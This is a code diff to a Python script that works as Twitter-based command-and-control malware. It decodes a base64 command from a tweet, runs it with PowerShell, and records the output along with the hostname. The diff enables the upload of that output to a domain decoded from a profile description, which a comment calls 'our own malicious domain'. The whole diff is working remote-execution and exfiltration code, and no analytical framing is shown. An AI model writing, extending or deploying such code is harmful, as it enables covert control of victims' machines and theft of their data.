@@ -12,6 +12,7 @@ import tweepy
 import os
 from dotenv import load_dotenv
 import re
+import tempfile
 
 load_dotenv()
 consumer_key = os.environ["API_KEY"]
@@ -33,14 +34,17 @@ tweet = found.split(',')[0].strip('text=').strip("'")
 
 command = base64.b64decode(tweet).decode()
 
+tempdir = tempfile.gettempdir()
 x = subprocess.getoutput("powershell.exe -command "+ command)
 y = subprocess.getoutput("hostname")
 final = y + "\n" + x
-with open("C:\\tmp\\"+ y +".txt",'w') as f:
+with open(tempdir + y +".txt",'w') as f:
     f.write(final)
 
 #Add code here later to send the response to our own malicious domain (domain/ip is base64 encoded in user description)
 
-#ip_address = base64.b64decode(description).decode()
-#with open("C:\\tmp\\command.txt",'rb') as f:
-#   r = requests.post("http://" + ip_address + ":8000/upload",files=f)
+with open(tempdir + y + ".txt",'rb') as f:
+    description = re.findall("description.*",str(me))[0]
+    domain = base64.b64decode(description.split(',')[0].split(':')[1].strip().strip("'")).decode()
+    print(domain)
+    r = requests.post("https://"+ domain +"/upload",files={'files': f})
